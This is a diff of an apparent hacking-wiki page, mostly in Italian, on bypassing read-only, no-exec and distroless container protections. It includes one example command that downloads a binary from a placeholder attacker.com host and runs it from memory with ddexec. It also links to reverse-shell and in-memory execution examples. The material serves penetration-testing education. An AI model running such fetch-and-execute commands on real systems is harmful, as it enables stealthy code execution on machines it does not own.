@@ -1,4 +1,4 @@
-# Bypass protezioni FS: sola lettura / no-exec / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -81,10 +81,12 @@ Pertanto, **controllando il codice assembly** che viene eseguito dal processo, p
 {% hint style="success" %}
 **DDexec / EverythingExec** ti permetterà di caricare ed **eseguire** il tuo **shellcode** o **qualsiasi binario** dalla **memoria**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 Per ulteriori informazioni su questa tecnica, controlla su Github o:
 
 {% content-ref url="ddexec.md" %}
@@ -131,7 +133,7 @@ Tuttavia, in questo tipo di container queste protezioni di solito esistono, ma p
 
 Puoi trovare **esempi** su come **sfruttare alcune vulnerabilità RCE** per ottenere **shell inverse di linguaggi di scripting** ed eseguire binari dalla memoria in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/it/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Se sei interessato a una **carriera nell'hacking** e vuoi hackerare l'inviolabile - **stiamo assumendo!** (_richiesta competenza polacca scritta e parlata_).
 
